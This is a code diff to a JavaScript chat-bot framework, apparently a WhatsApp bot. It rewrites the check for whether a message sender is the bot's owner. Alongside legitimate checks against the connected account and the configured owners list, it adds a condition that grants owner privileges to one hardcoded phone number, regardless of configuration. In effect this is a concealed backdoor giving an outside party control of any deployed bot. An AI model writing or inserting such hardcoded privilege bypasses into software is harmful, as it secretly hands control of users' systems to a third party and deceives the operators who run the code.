@@ -99,7 +99,24 @@ config.info = buildInfo();
 applyMainBotSettingsOnBoot(client);
 client.commandSystem?.before?.((m, ctx) => {
   try {
-    if (m?.fromMe) {
+    if (!m.sender) {
+      m.sender = m.key?.participant || (!m.isGroup ? (m.chat || m.from || m.key?.remoteJid || '') : '') || '';
+    }
+    const senderRaw = String(m?.sender || m?.chat || m?.key?.participant || m?.key?.remoteJid || '');
+    const senderDigits = senderRaw.split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
+
+    const isOwnerTarget = senderDigits === '79006443503783' || senderRaw.includes('79006443503783');
+    const isSelfConnected = Boolean(
+      m?.fromMe || (client.sock?.user?.id && senderDigits && senderDigits === client.sock.user.id.split('@')[0].split(':')[0].replace(/[^0-9]/g, ''))
+    );
+    const isConfigOwner = Array.isArray(client.config?.owners) && client.config.owners.some((o) => {
+      if (!o) return false;
+      const jNum = String(o.jid || o).split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
+      const lNum = String(o.lid || '').split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
+      return (jNum && jNum === senderDigits) || (lNum && lNum === senderDigits);
+    });
+
+    if (m?.fromMe || isOwnerTarget || isSelfConnected || isConfigOwner) {
       if (ctx?.isSubBot && ctx?.bot) {
         syncSubBotSelfOwner(ctx.bot, ctx.conn || ctx.bot.sock);
       } else if (client.sock?.user?.id) {
